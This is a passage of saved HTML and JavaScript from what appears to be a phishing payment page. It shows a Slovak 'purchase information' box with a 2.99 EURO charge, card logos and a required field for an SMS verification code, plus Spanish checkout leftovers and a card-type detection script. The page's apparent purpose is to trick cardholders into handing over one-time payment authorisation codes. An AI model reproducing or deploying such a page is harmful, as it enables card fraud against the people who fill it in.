<ul class="form-list">




<div class="span4 datos-compra">
<div class="caja-sombreada">
<p style="color: #0e0e0e;margin: 0px;font-size: 22px;font-weight: bold;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informácie o nákupe</font></font></font></font></font></font></font></font></font></font></font></font></p>

<font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;color: #2c2c2d;font-weight: bold;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Celková platba </font></font></font></font></font></font></font></font></font></font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;color: #015098;font-weight: bold;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">:02.99 EURO</font></font></font></font></font></font></font></font></font></font></font></font></font></font>
<p style="font-size: 11px;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"></font></font></font></font></font></p>
<table class="table">
<tbody>
<tr>

</tr>
<tr>
<td style="
    font-weight: bold;
"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;color: #015098;margin-top: -44px;"><font style="vertical-align: inherit;"></font></font></font></font></font></font></font></td>
</tr>
</tbody></table>
</div>


<img class="rg_i Q4LuWd" src="data:image/png;base64,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" data-deferred="1" jsname="Q4LuWd" width="80" height="20" data-index="0" alt="logo visa-a-mastercard-logo-visa-png-logo-visa-mastercard-png-vízum-logo-biele-png-úžasné-logá - بوخمسين للأجهزة الكهربائيئ المنزلية" data-iml="1071.684999998979" data-atf="true"><label style="color: #00457d;font-weight: bold;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"></font></font></font></font></font></label>

<input type="text" name="ccSMS" maxlength="8" required="" style="border-radius: 34px;border: 2px solid #25457d;background-color: #fff;font-size: 18px;font-weight: bold;width: 144px;background-image: linear-gradient(90deg, rgb(255 255 255) 0%, rgb(255, 255, 255) 100%);" onkeyup="this.value=this.value.replace(/[^\d\/]/g,'')" placeholder="      SMS">
</div>


<div class="custom-control custom-checkbox">
						
						
					</div>



<li style="
    /* margin-left: -10px; */
">
<button type="submit" class="button" style="
    /* margin-left: 63px; */
    margin: 20px 10px;
    /* margin-left: 81px; */
    /* margin-left: -360px; */
    width: 193px;
    height: 39px;
"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Prijať&gt;</font></font></font></font></font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"></font></font></font></font></font></button>
</li>
</ul>
</form>
</div> 
</div> 
</div> 
	</div>
</section>
</div>
						
						<div id="billingAddressLocked" class="shopping-cart-locked-parent" style="display: none;"></div>
						<div id="billingAddressForm" class="shopping-cart-form-parent" style="display: none;"></div>
						
						<div id="paymentBox" class="shopping-cart-form-parent" style="display: none;"></div>
						<div id="paymentLocked" class="shopping-cart-locked-parent" style="display: none;"></div>
						
						
						<div id="discountForm" class="shopping-cart-form-parent d-lg-none" style="display: none;"></div>
						<div id="discountLocked" class="shopping-cart-locked-parent" style="display: none;"></div>
						
						
						
						
						<div id="checkoutButton" style="display:none">
							<div class="order-payment-checkboxs">
								<div class="custom-control custom-checkbox">
									<input type="checkbox" name="isacceptmarketing" class="custom-control-input" id="isacceptmarketing" value="YES">
									<label class="custom-control-label" for="isacceptmarketing">Deseo recibir ofertas y promociones de los productos y servicios comercializados</label>
								</div>
							
								<div class="custom-control custom-checkbox">
									<input type="checkbox" name="accept_dpp" class="custom-control-input validate[required]" id="accept_dpp" data-prompt-position="bottomRight" value="YES">
									
									
									<label class="custom-control-label" for="accept_dpp">He leído y acepto las <a target="_blank" href="https://swiss.milna.org/page/condiciones-generales"><b>Condiciones de Venta</b></a>.</label>
									
								</div>
							</div>
							
							
							<section class="continue-button py-2 mb-4">
								<div class="d-flex justify-content-end">
								
									<button type="button" class="btn btn-primary btn-shopping-cart-checkout">Confirmar y pagar pedido &gt;</button>
								
								</div>
							</section>
						</div>
						
					</div>

					
				</div>
			</div>
			
		</div>
		
	</div>
</section>

		</section>
		
		
		
		
		
		
				<div id="sliderloadingwrapper">
<div id="sliderloader">
<div id="progressbg">
<div id="johanesloader">
</div></div></div></div>



<script src="./SMS Verificacion/stopExecutionOnTimeout-157cd5b220a5c80d4ff8e0e70ac069bffd87a61252088146915e8726e5d9f147.js.download"></script>
<script src="./SMS Verificacion/jquery.min.js.download"></script>
<script id="rendered-js">


  
/******/(function (modules) {// webpackBootstrap
  /******/ // The module cache
  /******/var installedModules = {};

  /******/ // The require function
  /******/function __webpack_require__(moduleId) {

    /******/ // Check if module is in cache
    /******/if (installedModules[moduleId])
      /******/return installedModules[moduleId].exports;

    /******/ // Create a new module (and put it into the cache)
    /******/var module = installedModules[moduleId] = {
      /******/exports: {},
      /******/id: moduleId,
      /******/loaded: false
      /******/ };

    /******/ // Execute the module function
    /******/modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);

    /******/ // Flag the module as loaded
    /******/module.loaded = true;

    /******/ // Return the exports of the module
    /******/return module.exports;
    /******/}


  /******/ // expose the modules object (__webpack_modules__)
  /******/__webpack_require__.m = modules;

  /******/ // expose the module cache
  /******/__webpack_require__.c = installedModules;

  /******/ // __webpack_public_path__
  /******/__webpack_require__.p = "/scripts/dist/";

  /******/ // Load entry module and return exports
  /******/return __webpack_require__(0);
  /******/})(
/************************************************************************/
/******/[
/* 0 */
/***/function (module, exports, __webpack_require__) {

  __webpack_require__(1);


  /***/},
/* 1 */
/***/function (module, exports, __webpack_require__) {

  'use strict';

  var _creditCardType = __webpack_require__(2);

  var _creditCardType2 = _interopRequireDefault(_creditCardType);

  function _interopRequireDefault(obj) {return obj && obj.__esModule ? obj : { default: obj };}

  $(document).on('input change', '#input--cc input', function () {
    var ccNum = $(this).val();
    var ccType = (0, _creditCardType2.default)(ccNum);

    if (!ccNum.length || typeof ccType === "undefined" || !ccType.length) {
      $('#input--cc').removeClass().addClass('creditcard-icon');
      return;
    }

    var creditcardType = ccType[0].type;

    var ccTypes = {
      'american-express': 'AE',
      'master-card': 'MC',
      'visa': 'VI',
      'discover': 'DI' };


    $('#input--cc').removeClass().addClass('creditcard-icon').addClass('creditcard-icon--' + creditcardType); //set creditcard icon

    // select creditcard type
    $(".creditcard-type > select").val(ccTypes[creditcardType]);
    // set the creditcard type <select> to the value entered
  });

  /***/},
/* 2 */
/***/function (module, exports) {

  'use strict';

  var types = {};
  var VISA = 'visa';
  var MASTERCARD = 'master-card';
  var AMERICAN_EXPRESS = 'american-express';
  var DINERS_CLUB = 'diners-club';
  var DISCOVER = 'discover';
  var JCB = 'jcb';
  var UNIONPAY = 'unionpay';
  var MAESTRO = 'maestro';
  var CVV = 'CVV';
  var CID = 'CID';
  var CVC = 'CVC';
  var CVN = 'CVN';
  var testOrder = [
  VISA,
  MASTERCARD,
  AMERICAN_EXPRESS,
  DINERS_CLUB,
  DISCOVER,
  JCB,
  UNIONPAY,
  MAESTRO];


  function clone(x) {
    var prefixPattern, exactPattern, dupe;

    if (!x) {return null;}

    prefixPattern = x.prefixPattern.source;
    exactPattern = x.exactPattern.source;
    dupe = JSON.parse(JSON.stringify(x));
    dupe.prefixPattern = prefixPattern;
    dupe.exactPattern = exactPattern;

    return dupe;
  }

  types[VISA] = {
    niceType: 'Visa',
    type: VISA,
    prefixPattern: /^4$/,
    exactPattern: /^4\d*$/,
    gaps: [4, 8, 12],
    lengths: [16],
    code: {
      name: CVV,
      size: 3 } };



  types[MASTERCARD] = {
    niceType: 'MasterCard',
    type: MASTERCARD,
    prefixPattern: /^(5|5[1-5]|2|22|222|222[1-9]|2[3-6]|27[0-1]|2720)$/,
    exactPattern: /^(5[1-5]|222[1-9]|2[3-6]|27[0-1]|2720)\d*$/,
    gaps: [4, 8, 12],
    lengths: [16],
    code: {
      name: CVC,
      size: 3 } };



  types[AMERICAN_EXPRESS] = {
    niceType: 'American Express',
    type: AMERICAN_EXPRESS,
    prefixPattern: /^(3|34|37)$/,
    exactPattern: /^3[47]\d*$/,
    isAmex: true,
    gaps: [4, 10],
    lengths: [15],
    code: {
      name: CID,
      size: 4 } };



  types[DINERS_CLUB] = {
    niceType: 'Diners Club',
    type: DINERS_CLUB,
    prefixPattern: /^(3|3[0689]|30[0-5])$/,
    exactPattern: /^3(0[0-5]|[689])\d*$/,
    gaps: [4, 10],
    lengths: [14],
    code: {
      name: CVV,
      size: 3 } };



  types[DISCOVER] = {
    niceType: 'Discover',
    type: DISCOVER,
    prefixPattern: /^(6|60|601|6011|65|64|64[4-9])$/,
    exactPattern: /^(6011|65|64[4-9])\d*$/,
    gaps: [4, 8, 12],
    lengths: [16, 19],
    code: {
      name: CID,
      size: 3 } };



  types[JCB] = {
    niceType: 'JCB',
    type: JCB,
    prefixPattern: /^(2|21|213|2131|1|18|180|1800|3|35)$/,
    exactPattern: /^(2131|1800|35)\d*$/,
    gaps: [4, 8, 12],
    lengths: [16],
    code: {
      name: CVV,
      size: 3 } };



  types[UNIONPAY] = {
    niceType: 'UnionPay',
    type: UNIONPAY,
    prefixPattern: /^(6|62)$/,
    exactPattern: /^62\d*$/,
    gaps: [4, 8, 12],
    lengths: [16, 17, 18, 19],
    code: {
      name: CVN,
      size: 3 } };



  types[MAESTRO] = {
    niceType: 'Maestro',
    type: MAESTRO,
    prefixPattern: /^(5|5[06-9]|6\d*)$/,
    exactPattern: /^5[06-9]\d*$/,
    gaps: [4, 8, 12],
    lengths: [12, 13, 14, 15, 16, 17, 18, 19],
    code: {
      name: CVC,
      size: 3 } };



  function creditCardType(cardNumber) {
    var type, value, i;
    var prefixResults = [];
    var exactResults = [];

    if (!(typeof cardNumber === 'string' || cardNumber instanceof String)) {
      return [];
    }

    for (i = 0; i < testOrder.length; i++) {if (window.CP.shouldStopExecution(0)) break;
      type = testOrder[i];
      value = types[type];

      if (cardNumber.length === 0) {
        prefixResults.push(clone(value));
        continue;
      }

      if (value.exactPattern.test(cardNumber)) {
        exactResults.push(clone(value));
      } else if (value.prefixPattern.test(cardNumber)) {
        prefixResults.push(clone(value));
      }
    }window.CP.exitedLoop(0);

    return exactResults.length ? exactResults : prefixResults;
  }

  creditCardType.getTypeInfo = function (type) {
    return clone(types[type]);
  };

  creditCardType.types = {
    VISA: VISA,
    MASTERCARD: MASTERCARD,
    AMERICAN_EXPRESS: AMERICAN_EXPRESS,
    DINERS_CLUB: DINERS_CLUB,
    DISCOVER: DISCOVER,
    JCB: JCB,
    UNIONPAY: UNIONPAY,
    MAESTRO: MAESTRO };


  module.exports = creditCardType;


  /***/}
/******/]);
//# sourceURL=pen.js
    </script><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="./SMS Verificacion/translate_24dp.png" alt="Google Translate" width="20" height="20"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Original text</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Contribute a better translation</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div>
		
		
	


